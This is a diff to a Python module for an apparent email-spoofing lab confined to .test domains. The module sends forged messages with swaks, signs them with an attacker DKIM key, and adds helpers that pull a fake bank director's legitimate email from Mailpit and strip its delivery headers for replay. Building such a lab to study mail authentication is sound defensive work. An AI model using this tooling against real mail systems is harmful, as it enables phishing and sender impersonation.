@@ -2,6 +2,9 @@
 
 from __future__ import annotations
 
+import base64
+import json
+import quopri
 import re
 import subprocess
 import uuid
@@ -10,8 +13,8 @@ from email.message import EmailMessage
 from email.policy import SMTP
 from email.utils import formatdate
 from pathlib import Path
-
-import dkim
+from urllib.parse import quote
+from urllib.request import urlopen
 
 # Regla 3 de CLAUDE.md: solo dominios .test y solo el host «receptor».
 ALLOWED_SERVER = "receptor"
@@ -69,6 +72,7 @@ class Attack:
     envelope_from: str  # MAIL FROM (sobre)
     header_from: str  # From: (lo que ve el usuario)
     dkim: str  # firma DKIM que lleva
+    extra: bool = False  # fuera de la tabla de verdad (escenario 5): no entra en --todos
 
 
 @dataclass
@@ -106,6 +110,8 @@ def build_message(attack: Attack, recipient: str) -> tuple[bytes, str]:
 
 def dkim_sign(raw: bytes, domain: str, selector: str) -> bytes:
     """Agrega una firma DKIM válida de `domain` con la llave del atacante."""
+    import dkim  # solo el atacante firma; el reenviador no necesita dkimpy
+
     key = (KEYS_DIR / f"{selector}.private").read_bytes()
     signature = dkim.sign(
         raw,
@@ -150,14 +156,15 @@ def send_raw(
     recipient: str = DEFAULT_RECIPIENT,
     server: str = ALLOWED_SERVER,
     note: str = "",
+    helo: str = "mail.atacante.test",
 ) -> AttackResult:
-    """Envía el mensaje tal cual con swaks desde la IP del atacante."""
+    """Envía el mensaje tal cual con swaks desde la IP de este contenedor."""
     validate_destination(recipient, server)
     cmd = [
         "swaks",
         "--server", server,
         "--port", "25",
-        "--helo", "mail.atacante.test",
+        "--helo", helo,
         "--from", attack.envelope_from,
         "--to", recipient,
         "--data", "-",  # el mensaje completo llega por la entrada estándar
@@ -192,3 +199,108 @@ def send_simple(
     if sign_with:
         raw = dkim_sign(raw, *sign_with)
     return send_raw(attack, raw, message_id, recipient, server)
+
+
+# --- correos ya entregados: buscarlos en Mailpit y manipularlos ----------------------
+
+MAILPIT_API = "http://mailpit:8025/api/v1"
+# Cabeceras que agregó el receptor al entregarlo: se quitan, como haría un reenvío.
+TRACE_HEADERS = re.compile(
+    rb"^(Return-Path|Received|Authentication-Results|Delivered-To|X-Spam[\w-]*|X-Rspamd[\w-]*):",
+    re.IGNORECASE,
+)
+
+
+def _mailpit(path: str) -> bytes:
+    with urlopen(f"{MAILPIT_API}{path}", timeout=10) as resp:
+        return resp.read()
+
+
+def split_message(raw: bytes) -> tuple[list[bytes], bytes, bytes]:
+    """(cabeceras como líneas, fin de línea usado, cuerpo)."""
+    for sep in (b"\r\n\r\n", b"\n\n"):
+        if sep in raw:
+            head, body = raw.split(sep, 1)
+            eol = sep[: len(sep) // 2]
+            return head.split(eol), eol, body
+    raise AttackError("El correo original no tiene el formato esperado.")
+
+
+def header_blocks(lines: list[bytes]) -> list[list[bytes]]:
+    """Agrupa cada cabecera con sus líneas de continuación."""
+    blocks: list[list[bytes]] = []
+    for line in lines:
+        if line[:1] in (b" ", b"\t") and blocks:
+            blocks[-1].append(line)
+        else:
+            blocks.append([line])
+    return blocks
+
+
+def header_value(blocks: list[list[bytes]], name: bytes) -> bytes:
+    for block in blocks:
+        if block[0].lower().startswith(name.lower() + b":"):
+            return b" ".join(part.strip() for part in block).split(b":", 1)[1].strip()
+    return b""
+
+
+def decode_body(body: bytes, cte: bytes) -> bytes:
+    cte = cte.lower()
+    if cte == b"quoted-printable":
+        return quopri.decodestring(body)
+    if cte == b"base64":
+        return base64.b64decode(body)
+    return body
+
+
+def encode_body(body: bytes, cte: bytes, eol: bytes) -> bytes:
+    cte = cte.lower()
+    if cte == b"quoted-printable":
+        encoded = quopri.encodestring(body.replace(b"\r\n", b"\n"))
+    elif cte == b"base64":
+        encoded = base64.encodebytes(body)
+    else:
+        return body
+    return encoded.replace(b"\n", eol)
+
+
+def without_trace_headers(raw: bytes) -> tuple[list[list[bytes]], bytes, bytes]:
+    """(cabeceras sin las de entrega, fin de línea, cuerpo)."""
+    lines, eol, body = split_message(raw)
+    blocks = [b for b in header_blocks(lines) if not TRACE_HEADERS.match(b[0])]
+    return blocks, eol, body
+
+
+def join_message(blocks: list[list[bytes]], eol: bytes, body: bytes) -> bytes:
+    return eol.join(line for block in blocks for line in block) + eol + eol + body
+
+
+def latest_legit_message() -> tuple[bytes, bool]:
+    """Último correo legítimo del director en Mailpit: (raw, ¿firmado por el banco?).
+
+    Prefiere uno firmado con DKIM; si no hay, usa uno sin firmar (escenarios 0 y 1).
+    Descarta los que traen la cuenta del atacante (ataques o copias de A3) y los que ya
+    pasaron por una lista de correo.
+    """
+    query = quote('from:"director@bancoseguro.test"')
+    found = json.loads(_mailpit(f"/search?query={query}&limit=50"))["messages"]
+    unsigned: bytes | None = None
+    for summary in found:  # Mailpit devuelve primero los más recientes
+        raw = _mailpit(f"/message/{summary['ID']}/raw")
+        lines, _, body = split_message(raw)
+        blocks = header_blocks(lines)
+        cte = header_value(blocks, b"Content-Transfer-Encoding")
+        if ATTACKER_ACCOUNT.encode() in decode_body(body, cte):
+            continue
+        if header_value(blocks, b"List-Id"):
+            continue
+        signature = header_value(blocks, b"DKIM-Signature")
+        if re.search(rb"\bd=bancoseguro\.test\b", signature):
+            return raw, True
+        unsigned = unsigned or raw
+    if unsigned is None:
+        raise AttackError(
+            "No hay ningún correo legítimo del director en Mailpit. "
+            "Primero envía uno con: ./lab.sh enviar legit"
+        )
+    return unsigned, False
